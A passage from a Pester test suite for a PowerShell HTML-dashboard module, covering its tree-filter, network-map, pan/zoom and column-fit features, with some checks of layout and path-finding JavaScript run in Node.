            Export-DhTestHtml -Report $r | Should -Match '"charts":\[\],"allClear":"None found."'
        }
        It 'still warns about an empty table without the text, and ignores the text when there is data' {
            $r = New-DhDashboard -Title 't'
            $w = Add-DhTable -Report $r -TableId 'e' -Title 'Stale' -Data @() 3>&1
            ($w | Out-String) | Should -Match 'Data array is empty'
            Add-DhTable -Report $r -TableId 'f' -Title 'F' -Data $script:rows -AllClearText 'x'
            Export-DhTestHtml -Report $r | Should -Not -Match '"allClear"'
        }
    }

    Context 'Pan and zoom helper and the topology print selector' {
        BeforeAll { $script:topoHtml = Export-DhTestHtml -Report (& $script:newReport) }
        It 'shares one pan/zoom factory with the topology map' {
            $script:topoHtml | Should -Match 'function createPanZoom\(o\)'
            (Get-DhTestJsFunction -Html $script:topoHtml -Name 'renderTopologyMap') | Should -Match 'createPanZoom\(\{'
        }
        It 'adds the window drag listeners only for the length of a drag, and cleans up on removal' {
            $fn = Get-DhTestJsFunction -Html $script:topoHtml -Name 'createPanZoom'
            ([regex]::Matches($fn, "window\.addEventListener\('mousemove'")).Count | Should -Be 1
            $fn | Should -Match "window\.removeEventListener\('mousemove', onMove\)"
            $fn | Should -Match 'innerDiv\.isConnected'
            (Get-DhTestJsFunction -Html $script:topoHtml -Name 'renderTopologyMap') | Should -Not -Match "window\.addEventListener\('mousemove'"
        }
        It 'hides the real topology toolbar class in print' {
            $script:topoHtml | Should -Match '\.topology-map-toolbar \{ display: none !important; \}'
        }
    }

    Context 'Third-party notices' {
        It 'lists every vendored library licence and ships with the build' {
            $notes = Get-Content (Join-Path $script:root 'THIRD-PARTY-NOTICES.md') -Raw
            foreach ($f in Get-ChildItem (Join-Path $script:root 'DashHtml/Vendor') -Filter 'LICENSE-*.txt') {
                $notes | Should -Match ([regex]::Escape($f.Name)) -Because $f.Name
            }
            $notes | Should -Match 'GPL / AGPL'   # the contributor rule (the design-reference table was trimmed)
            (Get-Content (Join-Path $script:root 'Build.ps1') -Raw) | Should -Match "THIRD-PARTY-NOTICES\.md"
        }
    }

    Context 'Tooling knows the new blocks' {
        It 'maps both cmdlets in DashHtml.Design and lists them in the audit and reference tools' {
            $root = $script:root
            $schema = Get-Content (Join-Path $root 'DashHtml.Design/Private/DhSchema.ps1') -Raw
            $schema | Should -Match "keyvalue\s+= 'Add-DhKeyValue'"
            $schema | Should -Match "recordlist\s+= 'Add-DhRecordList'"
            $rev = Get-Content (Join-Path $root 'DashHtml.Design/Public/ConvertFrom-DhScript.ps1') -Raw
            $rev | Should -Match "'add-dhkeyvalue'='keyvalue'"
            $rev | Should -Match "'add-dhrecordlist'='recordlist'"
            foreach ($f in 'DashHtml.Design/Public/Update-DhScript.ps1', 'Tools/Test-DhV2Upgrade.ps1') {
                $list = [regex]::Match((Get-Content (Join-Path $root $f) -Raw), '(?s)\$blockCmds = @\((.*?)\r?\n\s*\)').Groups[1].Value
                $list | Should -Match "'Add-DhKeyValue'" -Because $f
                $list | Should -Match "'Add-DhRecordList'" -Because $f
            }
            $ref = Get-Content (Join-Path $root 'Build-DhReference.ps1') -Raw
            $ref | Should -Match "'Add-DhKeyValue'\s+= @\{"
            $ref | Should -Match "'Add-DhRecordList'\s+= @\{"
            (Import-PowerShellDataFile (Join-Path $root 'DashHtml/DashHtml.psd1')).FunctionsToExport | Should -Contain 'Add-DhKeyValue'
            (Import-PowerShellDataFile (Join-Path $root 'DashHtml/DashHtml.psd1')).FunctionsToExport | Should -Contain 'Add-DhRecordList'
        }
    }
}

Describe 'v2.4.0 features' {

    BeforeAll {
        . (Join-Path $PSScriptRoot 'DhTestHelpers.ps1')
        $script:root = Join-Path $PSScriptRoot '..'
        $script:ous = @(
            [pscustomobject]@{ Name = 'contoso.com'; Path = 'contoso.com' }
            [pscustomobject]@{ Name = 'HQ';          Path = 'contoso.com/HQ' }
            [pscustomobject]@{ Name = 'Users';       Path = 'contoso.com/HQ/Users' }
            [pscustomobject]@{ Name = 'HQ2';         Path = 'contoso.com/HQ2' }
        )
        $script:newReport = {
            $r = New-DhDashboard -Title 't'
            Add-DhTable -Report $r -TableId 'ous' -Title 'OUs' -Data $script:ous
            $r
        }
        $script:treeNodes = {
            @(
                @{ Id = 'root'; Label = 'contoso.com'; Path = 'contoso.com' }
                @{ Id = 'hq';   Parent = 'root'; Label = 'HQ'; Path = 'contoso.com/HQ'; Status = 'warning'; Flags = @('empty') }
            )
        }
    }

    Context 'Topology cycle check' {
        It 'builds a 200-node chain quickly and still reports a cycle' {
            $r = New-DhDashboard -Title 't'
            $nodes = foreach ($i in 0..199) { @{ Id = "n$i"; Label = "N$i"; Parent = $(if ($i) { "n$($i - 1)" } else { '' }) } }
            (Measure-Command { Add-DhTopologyMap -Report $r -Id 'm' -Title 'm' -Nodes $nodes }).TotalSeconds | Should -BeLessThan 3
            $nodes[0].Parent = 'n199'
            { Add-DhTopologyMap -Report $r -Id 'm2' -Title 'm' -Nodes $nodes } | Should -Throw '*cycle detected*'
        }
    }

    Context 'Table path-filter hook' {
        BeforeAll {
            $script:html = Export-DhTestHtml -Report (& $script:newReport)
        }
        It 'assigns pathFilter only inside setPathFilter (and the constructor)' {
            ([regex]::Matches($script:html, '\.pathFilter\s*=(?!=)')).Count | Should -Be 2
            (Get-DhTestJsFunction -Html $script:html -Name 'setPathFilter') | Should -Match 'this\.pathFilter\s*=\s*spec'
        }
        It 'has one text matcher shared by the filter and the search' {
            (Get-DhTestJsFunction -Html $script:html -Name '_getFiltered') | Should -Match '_matchText'
            (Get-DhTestJsFunction -Html $script:html -Name '_matchText') | Should -Match 'FMT\.apply'
        }
        It 'matches on the separator so HQ does not match HQ2 (prefix and suffix)' -Skip:(-not (Get-Command node -ErrorAction SilentlyContinue)) {
            $src = (Get-DhTestJsFunction -Html $script:html -Name 'dhPathNorm') + "`n" + (Get-DhTestJsFunction -Html $script:html -Name 'dhPathMatch')
            $js = $src + @'

const t = [
  [dhPathMatch('contoso.com/HQ/Users', 'contoso.com/HQ', '/', 'prefix'), true],
  [dhPathMatch('contoso.com/HQ',       'contoso.com/HQ', '/', 'prefix'), true],
  [dhPathMatch('contoso.com/HQ2',      'contoso.com/HQ', '/', 'prefix'), false],
  [dhPathMatch('CONTOSO.com/hq/x',     'contoso.com/HQ', '/', 'prefix'), true],
  [dhPathMatch(null,                   'a', '/', 'prefix'), false],
  [dhPathMatch('OU=Users,OU=HQ,DC=c',  'OU=HQ,DC=c', ',', 'suffix'), true],
  [dhPathMatch('OU=Users, OU=HQ, DC=c','OU=HQ,DC=c', ',', 'suffix'), true],
  [dhPathMatch('OU=Users,OU=XHQ,DC=c', 'OU=HQ,DC=c', ',', 'suffix'), false],
  [dhPathMatch('OU=HQ,DC=c',           'OU=HQ,DC=c', ',', 'suffix'), true]
];
const bad = t.map((x, i) => x[0] === x[1] ? null : i).filter(x => x !== null);
console.log(bad.length ? 'FAIL ' + bad.join(',') : 'OK');
'@
            $f = Join-Path ([IO.Path]::GetTempPath()) ('dhpm_' + [guid]::NewGuid().ToString('N') + '.js')
            try { Set-Content -LiteralPath $f -Value $js -Encoding utf8NoBOM; (& node $f) | Should -Be 'OK' }
            finally { Remove-Item -LiteralPath $f -ErrorAction SilentlyContinue }
        }
        It 'saves the tree selection in the URL state only when one is made' {
            $script:html | Should -Match 'state\.pathFilters\s*=\s*pfs'
        }
    }

    Context 'Add-DhTreeFilter' {
        It 'stores the block and exports it as treefilter' {
            $r = & $script:newReport
            Add-DhTreeFilter -Report $r -Id 'tf' -Title 'OUs' -TableId 'ous' -PathField 'Path' -Nodes (& $script:treeNodes)
            $h = Export-DhTestHtml -Report $r
            $h | Should -Match '"blockType":"treefilter"'
            $h | Should -Match '"pathField":"Path"'
            $h | Should -Match '"status":"warn"'
            $h | Should -Match '"flags":\["empty"\]'
            $h | Should -Not -Match '"count":'
        }
        It 'emits counts and detail only when given' {
            $r = & $script:newReport
            Add-DhTreeFilter -Report $r -Id 'tf' -Title 'OUs' -TableId 'ous' -PathField 'Path' -Nodes @(
                @{ Id = 'a'; Label = 'A'; Path = 'a'; Count = 5; Detail = 'More text' })
            $h = Export-DhTestHtml -Report $r
            $h | Should -Match '"count":5'
            $h | Should -Match '"detail":\{'
        }
        It 'defaults the separator by match mode' {
            $r = & $script:newReport
            Add-DhTreeFilter -Report $r -Id 'a' -Title 'a' -TableId 'ous' -PathField 'Path' -Nodes @(@{ Id = 'a'; Label = 'A'; Path = 'a' })
            Add-DhTreeFilter -Report $r -Id 'b' -Title 'b' -TableId 'ous' -PathField 'Path' -Match Suffix -Nodes @(@{ Id = 'a'; Label = 'A'; Path = 'a' })
            ($r.Blocks | Where-Object Id -eq 'a').Separator | Should -Be '/'
            ($r.Blocks | Where-Object Id -eq 'b').Separator | Should -Be ','
        }
        It 'throws on <Name>' -ForEach @(
            @{ Name = 'an unknown table';      Table = 'nope'; Field = 'Path'; Pattern = "*table 'nope' not found*" }
            @{ Name = 'an unknown path field'; Table = 'ous';  Field = 'Nope'; Pattern = "*PathField 'Nope'*" }
        ) {
            $r = & $script:newReport
            { Add-DhTreeFilter -Report $r -Id 'tf' -Title 't' -TableId $Table -PathField $Field -Nodes @(@{ Id = 'a'; Label = 'A'; Path = 'a' }) } | Should -Throw $Pattern
        }
        It 'throws on a bad node: <Name>' -ForEach @(
            @{ Name = 'duplicate Id';      Nodes = @(@{ Id = 'a'; Label = 'A'; Path = 'a' }, @{ Id = 'a'; Label = 'B'; Path = 'b' }); Pattern = '*duplicate node Id*' }
            @{ Name = 'duplicate Path';    Nodes = @(@{ Id = 'a'; Label = 'A'; Path = 'x' }, @{ Id = 'b'; Label = 'B'; Path = 'X' }); Pattern = '*repeats Path*' }
            @{ Name = 'missing Path';      Nodes = @(@{ Id = 'a'; Label = 'A' }); Pattern = "*non-empty 'Path'*" }
            @{ Name = 'unknown parent';    Nodes = @(@{ Id = 'a'; Label = 'A'; Path = 'a'; Parent = 'zz' }); Pattern = '*unknown Parent*' }
            @{ Name = 'own parent';        Nodes = @(@{ Id = 'a'; Label = 'A'; Path = 'a'; Parent = 'a' }); Pattern = '*own Parent*' }
            @{ Name = 'cycle';             Nodes = @(@{ Id = 'a'; Label = 'A'; Path = 'a'; Parent = 'b' }, @{ Id = 'b'; Label = 'B'; Path = 'b'; Parent = 'a' }); Pattern = '*cycle detected*' }
            @{ Name = 'bad status';        Nodes = @(@{ Id = 'a'; Label = 'A'; Path = 'a'; Status = 'purple' }); Pattern = '*Status must be*' }
            @{ Name = 'negative count';    Nodes = @(@{ Id = 'a'; Label = 'A'; Path = 'a'; Count = -1 }); Pattern = '*Count must be*' }
        ) {
            $r = & $script:newReport
            { Add-DhTreeFilter -Report $r -Id 'tf' -Title 't' -TableId 'ous' -PathField 'Path' -Nodes $Nodes } | Should -Throw $Pattern
        }
        It 'rejects a duplicate block Id' {
            $r = & $script:newReport
            Add-DhTreeFilter -Report $r -Id 'tf' -Title 't' -TableId 'ous' -PathField 'Path' -Nodes @(@{ Id = 'a'; Label = 'A'; Path = 'a' })
            { Add-DhTreeFilter -Report $r -Id 'tf' -Title 't' -TableId 'ous' -PathField 'Path' -Nodes @(@{ Id = 'a'; Label = 'A'; Path = 'a' }) } | Should -Throw '*already exists*'
        }
        It 'warns above -MaxNodes without throwing' {
            $r = & $script:newReport
            $many = foreach ($i in 1..12) { @{ Id = "n$i"; Label = "N$i"; Path = "n$i" } }
            $w = Add-DhTreeFilter -Report $r -Id 'tf' -Title 't' -TableId 'ous' -PathField 'Path' -MaxNodes 10 -Nodes $many 3>&1
            "$w" | Should -Match 'exceeds -MaxNodes'
        }
        It 'renders after the engines exist and escapes labels' {
            $h = Export-DhTestHtml -Report (& $script:newReport)
            $h | Should -Match "blockType === 'treefilter'"
            (Get-DhTestJsFunction -Html $h -Name 'renderTreeFilter') | Should -Match 'esc\(n\.label\)'
            (Get-DhTestJsFunction -Html $h -Name 'renderTreeFilter') | Should -Not -Match '\son(click|keydown|input|change)\s*='
        }
        It 'warns when the TableId disappears from the finished report' {
            $r = & $script:newReport
            Add-DhTreeFilter -Report $r -Id 'tf' -Title 't' -TableId 'ous' -PathField 'Path' -Nodes @(@{ Id = 'a'; Label = 'A'; Path = 'a' })
            $r.Tables.Clear()
            (Export-DhTestHtml -Report $r -WithWarnings).Warnings -join ' ' | Should -Match "tree filter 'tf': TableId 'ous'"
        }
    }

    Context 'Tooling knows the 2.4.0 blocks' {
        It 'maps the new cmdlets in DashHtml.Design and lists them in the audit and reference tools' {
            $root = $script:root
            (Get-Content (Join-Path $root 'DashHtml.Design\Private\DhSchema.ps1') -Raw) | Should -Match "treefilter\s+= 'Add-DhTreeFilter'"
            (Get-Content (Join-Path $root 'DashHtml.Design\Public\ConvertFrom-DhScript.ps1') -Raw) | Should -Match "'add-dhtreefilter'='treefilter'"
            foreach ($f in 'DashHtml.Design/Public/Update-DhScript.ps1', 'Tools/Test-DhV2Upgrade.ps1') {
                (Get-Content (Join-Path $root $f) -Raw) | Should -Match "'Add-DhTreeFilter'" -Because $f
            }
            (Get-Content (Join-Path $root 'Build-DhReference.ps1') -Raw) | Should -Match "'Add-DhTreeFilter'\s+= @\{"
            (Import-PowerShellDataFile (Join-Path $root 'DashHtml/DashHtml.psd1')).FunctionsToExport | Should -Contain 'Add-DhTreeFilter'
        }
    }
}

Describe 'v2.4.0 features - network map' {

    BeforeAll {
        . (Join-Path $PSScriptRoot 'DhTestHelpers.ps1')
        $script:root = Join-Path $PSScriptRoot '..'
        $script:nodes = {
            @(
                @{ Id = 'a'; Label = 'A'; Group = 'g1'; Badge = @('PDC', 'GC'); Status = 'ok' }
                @{ Id = 'b'; Label = 'B'; Group = 'g1'; Status = 'critical'; Detail = 'More' }
                @{ Id = 'c'; Label = 'C'; Group = 'g2'; Tier = 2; Target = $true }
            )
        }
        $script:groups = { @(@{ Id = 'g1'; Label = 'G1' }, @{ Id = 'g2'; Label = 'G2'; Parent = 'g1' }) }
        $script:edges  = { @(@{ From = 'a'; To = 'b'; Label = '5 min'; Direction = 'both' }, @{ From = 'b'; To = 'c'; Status = 'warning'; Style = 'dashed' }) }
        $script:html = $null
        $script:jsFns = {
            param($h)
            ('dhNetFlow', 'dhNetBoundary', 'dhNetLayout', 'dhNetEdgeGeom', 'dhNetPath') | ForEach-Object { Get-DhTestJsFunction -Html $h -Name $_ }
        }
    }

    Context 'Add-DhNetworkMap' {
        It 'stores the block, normalises status words and exports it as networkmap' {
            $r = New-DhDashboard -Title 't'
            Add-DhNetworkMap -Report $r -Id 'nm' -Title 'Map' -Nodes (& $script:nodes) -Edges (& $script:edges) -Groups (& $script:groups) -Legend
            $h = Export-DhTestHtml -Report $r
            $h | Should -Match '"blockType":"networkmap"'
            $h | Should -Match '"layout":"grouped"'
            $h | Should -Match '"legend":true'
            $h | Should -Match '"badges":\["PDC","GC"\]'
            $h | Should -Match '"status":"danger"'
            $h | Should -Match '"status":"warn","style":"dashed","direction":"forward"'
            $h | Should -Match '"tier":2'
            $h | Should -Match '"target":true'
            $h | Should -Match '"detail":\{'
        }
        It 'keeps a single node, edge and group as arrays' {
            $r = New-DhDashboard -Title 't'
            Add-DhNetworkMap -Report $r -Id 'nm' -Title 'Map' -Nodes @(@{ Id = 'a'; Label = 'A'; Group = 'g'; Badge = 'PDC' }) -Groups @(@{ Id = 'g'; Label = 'G' })
            $b = $r.Blocks[0]
            $b.Nodes.Count | Should -Be 1
            @($b.Nodes[0].Badge).Count | Should -Be 1
            $b.Groups.Count | Should -Be 1
            $b.Edges.Count | Should -Be 0
            (Export-DhTestHtml -Report $r) | Should -Match '"edges":\[\]'
        }
        It 'throws on a bad input: <Name>' -ForEach @(
            @{ Name = 'duplicate node Id';   Nodes = @(@{ Id = 'a'; Label = 'A' }, @{ Id = 'a'; Label = 'B' }); Edges = @(); Groups = @(); Pattern = '*duplicate node Id*' }
            @{ Name = 'edge to unknown node'; Nodes = @(@{ Id = 'a'; Label = 'A' }); Edges = @(@{ From = 'a'; To = 'zz' }); Groups = @(); Pattern = "*To 'zz' is not a node Id*" }
            @{ Name = 'edge without From';   Nodes = @(@{ Id = 'a'; Label = 'A' }); Edges = @(@{ To = 'a' }); Groups = @(); Pattern = "*needs a non-empty 'From'*" }
            @{ Name = 'bad direction';       Nodes = @(@{ Id = 'a'; Label = 'A' }); Edges = @(@{ From = 'a'; To = 'a'; Direction = 'up' }); Groups = @(); Pattern = '*Direction must be*' }
            @{ Name = 'bad edge style';      Nodes = @(@{ Id = 'a'; Label = 'A' }); Edges = @(@{ From = 'a'; To = 'a'; Style = 'wavy' }); Groups = @(); Pattern = '*Style must be*' }
            @{ Name = 'unknown group';       Nodes = @(@{ Id = 'a'; Label = 'A'; Group = 'nope' }); Edges = @(); Groups = @(); Pattern = "*unknown Group 'nope'*" }
            @{ Name = 'duplicate group';     Nodes = @(@{ Id = 'a'; Label = 'A' }); Edges = @(); Groups = @(@{ Id = 'g'; Label = 'G' }, @{ Id = 'g'; Label = 'H' }); Pattern = '*duplicate group Id*' }
            @{ Name = 'unknown group parent'; Nodes = @(@{ Id = 'a'; Label = 'A' }); Edges = @(); Groups = @(@{ Id = 'g'; Label = 'G'; Parent = 'zz' }); Pattern = '*unknown Parent*' }
            @{ Name = 'group cycle';         Nodes = @(@{ Id = 'a'; Label = 'A' }); Edges = @(); Groups = @(@{ Id = 'g'; Label = 'G'; Parent = 'h' }, @{ Id = 'h'; Label = 'H'; Parent = 'g' }); Pattern = '*group cycle detected*' }
            @{ Name = 'bad tier';            Nodes = @(@{ Id = 'a'; Label = 'A'; Tier = -1 }); Edges = @(); Groups = @(); Pattern = '*Tier must be*' }
            @{ Name = 'bad node status';     Nodes = @(@{ Id = 'a'; Label = 'A'; Status = 'purple' }); Edges = @(); Groups = @(); Pattern = '*Status must be*' }
            @{ Name = 'LinkFilter alone';    Nodes = @(@{ Id = 'a'; Label = 'A'; LinkFilter = 'x' }); Edges = @(); Groups = @(); Pattern = '*LinkFilter requires LinkTableId*' }
        ) {
            $r = New-DhDashboard -Title 't'
            { Add-DhNetworkMap -Report $r -Id 'nm' -Title 'Map' -Nodes $Nodes -Edges $Edges -Groups $Groups } | Should -Throw $Pattern
        }
        It 'enforces -MaxNodes and -MaxEdges' {
            $r = New-DhDashboard -Title 't'
            $many = foreach ($i in 1..5) { @{ Id = "n$i"; Label = "N$i" } }
            { Add-DhNetworkMap -Report $r -Id 'nm' -Title 'Map' -Nodes $many -MaxNodes 4 } | Should -Throw '*exceeds -MaxNodes*'
            $e = foreach ($i in 1..3) { @{ From = 'n1'; To = 'n2' } }
            { Add-DhNetworkMap -Report $r -Id 'nm' -Title 'Map' -Nodes $many -Edges $e -MaxEdges 2 } | Should -Throw '*exceeds -MaxEdges*'
        }
        It 'rejects a duplicate block Id' {
            $r = New-DhDashboard -Title 't'
            Add-DhNetworkMap -Report $r -Id 'nm' -Title 'Map' -Nodes @(@{ Id = 'a'; Label = 'A' })
            { Add-DhNetworkMap -Report $r -Id 'nm' -Title 'Map' -Nodes @(@{ Id = 'a'; Label = 'A' }) } | Should -Throw '*already exists*'
        }
        It 'warns on a LinkTableId that is not a table' {
            $r = New-DhDashboard -Title 't'
            Add-DhNetworkMap -Report $r -Id 'nm' -Title 'Map' -Nodes @(@{ Id = 'a'; Label = 'A'; LinkTableId = 'ghost' }, @{ Id = 'b'; Label = 'B' }) -Edges @(@{ From = 'a'; To = 'b'; LinkTableId = 'ghost2' })
            $w = (Export-DhTestHtml -Report $r -WithWarnings).Warnings -join ' '
            $w | Should -Match "network map 'nm' node 'a': LinkTableId 'ghost'"
            $w | Should -Match "network map 'nm' edge 'a' to 'b': LinkTableId 'ghost2'"
        }
        It 'draws with one delegated handler, escapes text, and has no inline handlers' {
            $r = New-DhDashboard -Title 't'
            Add-DhNetworkMap -Report $r -Id 'nm' -Title 'Map' -Nodes (& $script:nodes) -Groups (& $script:groups)
            $h = Export-DhTestHtml -Report $r
            $fn = Get-DhTestJsFunction -Html $h -Name 'renderNetworkMap'
            $fn | Should -Not -Match '\son(click|keydown|input|change|mouse\w+)\s*='
            $fn | Should -Match 'esc\(dhNetTrunc\(label'
            ([regex]::Matches($fn, "svgEl\.addEventListener\('click'")).Count | Should -Be 1
            $fn | Should -Match 'createPanZoom\('
            $h | Should -Match "case 'networkmap':\s+renderNetworkMap"
        }
    }

    Context 'Layout and path finding (run in node)' -Skip:(-not (Get-Command node -ErrorAction SilentlyContinue)) {
        BeforeAll {
            $r = New-DhDashboard -Title 't'
            Add-DhNetworkMap -Report $r -Id 'nm' -Title 'Map' -Nodes (& $script:nodes) -Edges (& $script:edges) -Groups (& $script:groups)
            $script:h2 = Export-DhTestHtml -Report $r
            $script:runNode = {
                param([string] $Body)
                $src = "const DH_NET = { GX: 26, GY: 30, PAD: 14, HEAD: 26, TOP: 1100, MARGIN: 20, LANE_LABEL: 96, LANE_PAD: 30 };`n" + ((& $script:jsFns $script:h2) -join "`n") + "`n" + $Body
                $f = Join-Path ([IO.Path]::GetTempPath()) ('dhnm_' + [guid]::NewGuid().ToString('N') + '.js')
                try { Set-Content -LiteralPath $f -Value $src -Encoding utf8NoBOM; (& node $f 2>&1) -join "`n" }
                finally { Remove-Item -LiteralPath $f -ErrorAction SilentlyContinue }
            }
        }
        It 'gives the same grouped layout twice and keeps nodes inside their boxes' {
            $out = & $script:runNode @'
const block = { layout: 'grouped', nodeWidth: 150, nodeHeight: 46,
  nodes: [ {id:'a',group:'g1'}, {id:'b',group:'g1'}, {id:'c',group:'g2'}, {id:'d'} ],
  edges: [], groups: [ {id:'g1',label:'G1'}, {id:'g2',label:'G2',parent:'g1'} ] };
const L1 = dhNetLayout(block), L2 = dhNetLayout(block);
const same = JSON.stringify(L1) === JSON.stringify(L2);
const box = id => L1.groups.find(g => g.id === id);
const inside = (n, g) => { const p = L1.pos[n], b = box(g); return p.x >= b.x && p.y >= b.y && p.x + p.w <= b.x + b.w && p.y + p.h <= b.y + b.h; };
const nested = (() => { const o = box('g1'), i = box('g2'); return i.x >= o.x && i.y >= o.y && i.x + i.w <= o.x + o.w && i.y + i.h <= o.y + o.h; })();
console.log([same, inside('a','g1'), inside('b','g1'), inside('c','g2'), nested, Object.keys(L1.pos).length].join(','));
'@
            $out | Should -Be 'true,true,true,true,true,4'
        }
        It 'puts tier 0 above tier 1 and takes a missing tier from the link depth' {
            $out = & $script:runNode @'
const block = { layout: 'layered', nodeWidth: 150, nodeHeight: 46,
  nodes: [ {id:'t0',tier:0}, {id:'x'}, {id:'y'}, {id:'z',tier:5} ],
  edges: [ {from:'x',to:'y',direction:'forward'} ], groups: [] };
const L = dhNetLayout(block);
console.log([L.pos.t0.y < L.pos.z.y, L.pos.x.y === L.pos.t0.y, L.pos.y.y > L.pos.x.y, L.lanes.map(l => l.tier).join('/')].join(','));
'@
            $out | Should -Be 'true,true,true,0/1/5'
        }
        It 'copes with a cycle in layered mode' {
            $out = & $script:runNode @'
const block = { layout: 'layered', nodes: [ {id:'a'}, {id:'b'}, {id:'c'} ],
  edges: [ {from:'a',to:'b'}, {from:'b',to:'c'}, {from:'c',to:'a'} ], groups: [] };
const L = dhNetLayout(block);
console.log(Object.keys(L.pos).length + ':' + L.lanes.length);
'@
            $out | Should -Be '3:3'
        }
        It 'fans parallel edges out and loops a self edge' {
            $out = & $script:runNode @'
const pos = { a:{x:0,y:0,w:100,h:40}, b:{x:300,y:0,w:100,h:40} };
const g = dhNetEdgeGeom([ {from:'a',to:'b'}, {from:'b',to:'a'}, {from:'a',to:'a'}, {from:'a',to:'zz'} ], pos);
console.log([g[0].d !== g[1].d, g[0].my !== g[1].my, g[2].loop === true, g[3] === null].join(','));
'@
            $out | Should -Be 'true,true,true,true'
        }
        It 'traces the shortest directed path to the nearest target, deterministically' {
            $out = & $script:runNode @'
const block = { nodes: [ {id:'s'}, {id:'m1'}, {id:'m2'}, {id:'t1',target:true}, {id:'t2',target:true}, {id:'iso'} ],
  edges: [ {from:'s',to:'m1',direction:'forward'}, {from:'s',to:'m2',direction:'forward'},
           {from:'m1',to:'t1',direction:'forward'}, {from:'m2',to:'t2',direction:'forward'},
           {from:'iso',to:'s',direction:'forward'} ] };
const p = dhNetPath(block, 's');
const back = dhNetPath(block, 'iso');
const none = dhNetPath({ nodes: [ {id:'a'}, {id:'b',target:true} ], edges: [ {from:'b',to:'a',direction:'forward'} ] }, 'a');
const both = dhNetPath({ nodes: [ {id:'a'}, {id:'b',target:true} ], edges: [ {from:'b',to:'a',direction:'both'} ] }, 'a');
console.log([p.nodes.join('>'), p.edges.join('+'), back.nodes.join('>'), none === null, both.nodes.join('>'), dhNetPath(block,'t1').nodes.join('>')].join('|'));
'@
            $out | Should -Be 's>m1>t1|0+2|iso>s>m1>t1|true|a>b|t1'
        }
    }

    Context 'Tooling knows the network map' {
        It 'is mapped, listed and exported' {
            $root = $script:root
            (Get-Content (Join-Path $root 'DashHtml.Design\Private\DhSchema.ps1') -Raw) | Should -Match "networkmap\s+= 'Add-DhNetworkMap'"
            (Get-Content (Join-Path $root 'DashHtml.Design\Public\ConvertFrom-DhScript.ps1') -Raw) | Should -Match "'add-dhnetworkmap'='networkmap'"
            foreach ($f in 'DashHtml.Design/Public/Update-DhScript.ps1', 'Tools/Test-DhV2Upgrade.ps1') {
                (Get-Content (Join-Path $root $f) -Raw) | Should -Match "'Add-DhNetworkMap'" -Because $f
            }
            (Get-Content (Join-Path $root 'Build-DhReference.ps1') -Raw) | Should -Match "'Add-DhNetworkMap'\s+= @\{"
            (Import-PowerShellDataFile (Join-Path $root 'DashHtml/DashHtml.psd1')).FunctionsToExport | Should -Contain 'Add-DhNetworkMap'
        }
    }
}

Describe 'v2.4.0 features - column fit' {

    BeforeAll {
        . (Join-Path $PSScriptRoot 'DhTestHelpers.ps1')
        $script:rows = @([pscustomobject]@{ Name = 'a'; Path = 'x/y/z' })
        $script:export = {
            param([hashtable] $Extra = @{})
            $r = New-DhDashboard -Title 't'
            Add-DhTable -Report $r -TableId 'tb' -Title 'T' -Data $script:rows @Extra
            Export-DhTestHtml -Report $r
        }
        $script:html = & $script:export
    }

    Context 'Add-DhTable options' {
        It 'emits nothing for the default (auto) so existing tables export unchanged' {
            $script:html | Should -Not -Match '"columnFit"'
            $script:html | Should -Not -Match '"columnMax"'
            $script:html | Should -Not -Match '"minWidth"'
        }
        It 'emits columnFit fixed and a non-default maximum' {
            $h = & $script:export @{ ColumnFit = 'Fixed'; ColumnMaxWidth = 300 }
            $h | Should -Match '"columnFit":"fixed"'
            $h | Should -Match '"columnMax":300'
        }
        It 'rejects an unknown -ColumnFit and an out-of-range -ColumnMaxWidth' {
            $r = New-DhDashboard -Title 't'
            { Add-DhTable -Report $r -TableId 'a' -Title 'T' -Data $script:rows -ColumnFit Wide } | Should -Throw
            { Add-DhTable -Report $r -TableId 'b' -Title 'T' -Data $script:rows -ColumnMaxWidth 50 } | Should -Throw
        }
        It 'accepts a column MinWidth as 120, "120" or "120px" and emits it' {
            foreach ($mw in 120, '120', '120px') {
                $r = New-DhDashboard -Title 't'
                Add-DhTable -Report $r -TableId 'a' -Title 'T' -Data $script:rows -Columns @(@{ Field = 'Name'; Label = 'Name'; MinWidth = $mw })
                (Export-DhTestHtml -Report $r) | Should -Match '"minWidth":120'
            }
        }
        It 'rejects a bad MinWidth' {
            $r = New-DhDashboard -Title 't'
            { Add-DhTable -Report $r -TableId 'a' -Title 'T' -Data $script:rows -Columns @(@{ Field = 'Name'; Label = 'Name'; MinWidth = 'wide' }) } | Should -Throw '*MinWidth must be*'
            { Add-DhTable -Report $r -TableId 'a' -Title 'T' -Data $script:rows -Columns @(@{ Field = 'Name'; Label = 'Name'; MinWidth = 5 }) } | Should -Throw '*MinWidth must be*'
        }
    }

    Context 'Runtime' {
        It 'applies widths in the order dragged, declared, measured' {
            (Get-DhTestJsFunction -Html $script:html -Name '_effWidth') | Should -Match 'colWidths\[col\.field\]\)\s*\|\|\s*col\.width\s*\|\|\s*\(this\._fitW'
        }
        It 'skips measuring for Fixed and re-measures on fonts, density and new columns' {
            (Get-DhTestJsFunction -Html $script:html -Name '_ensureFit') | Should -Match "columnFit==='fixed'"
            (Get-DhTestJsFunction -Html $script:html -Name '_ensureFit') | Should -Match 'c\.field in self\._fitW'
            $script:html | Should -Match 'document\.fonts\.ready\.then'
            $script:html | Should -Match 'engines\[id\]\._refit\(\)'
        }
        It 'reads the font from a rendered cell and adds slack so the last glyph is never clipped' {
            $fn = Get-DhTestJsFunction -Html $script:html -Name '_measureCol'
            $fn | Should -Match 'getComputedStyle\(cell\)'
            $fn | Should -Match '\+\s*4\)'
        }
        It 'fits to the widest text, the header, the cap and the floor (run in node)' -Skip:(-not (Get-Command node -ErrorAction SilentlyContinue)) {
            $src = (Get-DhTestJsFunction -Html $script:html -Name '_measureCol')
            $js = @'
const FMT = { apply: (c, v) => String(v) };
function dhFitFont() { return ''; } function dhFitPad() { return 0; }
const TableEngine = function () {};
'@ + "`n" + $src + @'

const ctx = { font: '', measureText: s => ({ width: String(s).length * 7 }) };
const env = { row: null, off: 0, headFont: '', ls: 1, padH: 24 };
const mk = rows => ({ allData: rows.map(v => ({ f: v })), columnMax: 800 });
const run = (rows, col, max) => { const e = mk(rows); if (max) e.columnMax = max; return TableEngine.prototype._measureCol.call(e, Object.assign({ field: 'f', label: 'A' }, col), 0, ctx, env); };
const r = [
  run(['x'.repeat(10), 'x'.repeat(30)], {}),                        // widest cell: 210 + 24 + 4
  run(['x'], { label: 'L'.repeat(40) }),                            // header: 280 + 40 + 30 + 24, then + 4
  run(['x'.repeat(200)], {}),                                       // capped
  run(['x'], { minWidth: 300 }),                                    // floor
  run(['x'.repeat(10)], { cellType: 'badge' }),                     // + 22
